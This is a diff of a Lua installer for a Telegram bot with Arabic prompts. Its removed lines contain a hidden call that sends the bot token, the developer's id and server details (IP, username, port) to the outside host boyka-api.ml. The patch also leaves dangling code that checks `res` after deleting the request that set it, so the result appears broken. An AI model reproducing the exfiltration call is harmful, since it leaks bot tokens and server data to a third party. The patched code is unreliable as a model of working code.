@@ -26,8 +26,6 @@ end
 if not database:get(Server_Done.."Token_Write") then
 print('\27[0;31m\n ارسل لي توكن البوت الان ↓ :\na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\27')
 local token = io.read()
-if token ~= '' then
-data,res = https.request("https://boyka-api.ml/index.php?p=BOYKA-DeV")
 if res == 200 then
 tr = json:decode(data)
 if tr.Info.info == 'Is_Spam' then
@@ -81,16 +79,13 @@ io.write('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end
 os.execute('lua install.lua')
 end
-local function Files_Info_Get()
-Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"),database:get(Server_Done.."User_Write")) 
-http.request("https://boyka-api.ml/index.php?n=BOYKA-DeV&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
 local RunBot = io.open("Dndn", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
 cd $HOME/Dndn
 token="]]..database:get(Server_Done.."Token_Write")..[["
 rm -fr Dndn.lua
-wget "https://raw.githubusercontent.com/BOYKA-DeV/BoykA/main/BoykA.lua"
+wget "https://raw.githubusercontent.com/BOYKA-DeV/BoykA/main/Dndn.lua"
 while(true) do
 rm -fr ../.telegram-cli
 ./tg -s ./Dndn.lua -p PROFILE --bot=$token
